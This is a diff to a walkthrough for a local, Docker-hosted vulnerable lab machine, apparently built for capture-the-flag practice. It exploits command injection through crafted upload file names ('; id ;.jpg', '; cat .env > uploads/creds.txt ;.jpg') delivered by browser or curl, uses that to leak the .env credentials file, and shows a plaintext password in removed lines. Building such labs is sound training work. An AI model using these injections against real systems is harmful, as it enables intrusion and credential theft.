@@ -32,24 +32,61 @@ If you need to update the files and re-test:
    sudo docker run -d -p 80:80 --name archival-test archival
    ```
 
+### Step 1: Web Foothold (Browser Method)
+1. **Access the Portal**: Open `http://localhost` in your browser.
+2. **Prepare the Payload**:
+   - Since some shells/filesystems (like `zsh`) reject semicolons in filenames, it's easier to create a file first and then rename it:
+     ```bash
+     echo "test" > payload.jpg
+     mv payload.jpg '"; id ;.jpg"'
+     ```
+3. **Upload via UI**:
+   - On the web page, click **"Browse"** or **"Choose File"**.
+   - Select the file named `"; id ;.jpg"`.
+   - Before clicking upload, append `?debug=1` to the URL in your browser: `http://localhost/process.php?debug=1`.
+   - Click **"Upload and Process"**.
+4. **View Results**:
+   - You will see the shell output directly on the page in the "Debug" box.
+
+### Step 2: Lateral Move (Browser Method)
+1. **Prepare the Credential Leak**:
+   - Rename your payload file to leak the `.env`:
+     ```bash
+     mv '"; id ;.jpg"' '"; cat .env > uploads/creds.txt ;.jpg"'
+     ```
+2. **Upload via UI**:
+   - Follow the same upload process as before.
+3. **Access the Leak**:
+   - Visit `http://localhost/uploads/creds.txt` (you'll need to find the session folder name from the debug output first).
+3. SSH into the container (if SSH is running) or simulate with:
+   ```bash
+   sudo docker exec -it archival-test su - archivist
+   ```
+
 ### Step 1: Web Foothold
 1. Visit `http://localhost/index.php`.
 2. Observe the "Upload Document" feature.
-3. Test for command injection by uploading a file with a special name. 
-   - Since you are testing locally, you can use a simple ping or file creation to verify:
-   - Create a file: `touch "; touch /tmp/pwned ;.jpg"`
-   - Upload it.
+3. **Verify the exploit** using `curl` (this is more reliable than naming files locally):
+   - Create a dummy file: `echo "test" > test.jpg`
+   - Upload it using `curl` with a slash-free command like `id` to avoid `basename()` stripping the path:
+     ```bash
+     curl -X POST "http://localhost/process.php?debug=1" \
+          -F 'document=@test.jpg;filename="; id ;.jpg"'
+     ```
 4. Verify execution:
-   ```bash
-   sudo docker exec archival-test ls /tmp/pwned
-   ```
-   *If the file exists, the injection worked!*
+   Look for the `uid=0(root)` or `uid=33(www-data)` in the **System Log** section of the response.
+   *Note: Using `/` in the filename will cause `basename()` to strip the command, which is a realistic security constraint for this machine!*
 
 ### Step 2: Lateral Move
-1. Use the injection to read the `.env` file:
-   - File name: `; cat .env > uploads/creds.txt ;.jpg`
-   - Access `http://localhost/uploads/creds.txt` (you might need to find the session folder name first or use a reverse shell).
-2. Note credentials: `archivist:Archivist2026!`.
+1. Use the same `curl` method to read the `.env` file:
+   ```bash
+   curl -X POST http://localhost/process.php?debug=1 \
+        -F "document=@test.jpg;filename=; cat .env > uploads/creds.txt ;.jpg"
+   ```
+2. Retrieve the credentials (check the session directory for `creds.txt`):
+   ```bash
+   sudo docker exec archival-test find /var/www/html/uploads -name "creds.txt" -exec cat {} +
+   ```
 3. SSH into the container (if SSH is running) or simulate with:
    ```bash
    sudo docker exec -it archival-test su - archivist
